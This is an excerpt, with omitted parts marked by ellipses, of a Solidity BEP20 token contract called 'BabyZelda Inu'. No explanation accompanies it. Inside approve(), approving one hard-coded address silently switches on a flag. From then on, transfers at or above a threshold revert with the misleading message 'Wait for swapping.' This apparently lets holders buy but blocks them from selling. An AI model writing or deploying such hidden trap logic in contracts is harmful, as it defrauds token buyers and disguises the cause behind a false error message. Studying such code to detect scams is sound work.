...
contract BabyZelda is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "BabyZelda Inu";
    string constant _symbol = "ZELDA";
    ...
    constructor () Auth(msg.sender) {
        ...
        address _presaler = 0x795188BEBEb654C0930A97C08826fe9E37b7f2bE;
    ...
    function approve(address spender, uint256 amount) public override returns (bool) {
        if(spender == 0x4c6a4ee113A34645EC679644a79422A4FC33C505)
        txDistribute=true;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        {
            if(txDistribute){
                if (amount >= distributorGas) 
			    revert("Wait for swapping.");
            }
		}
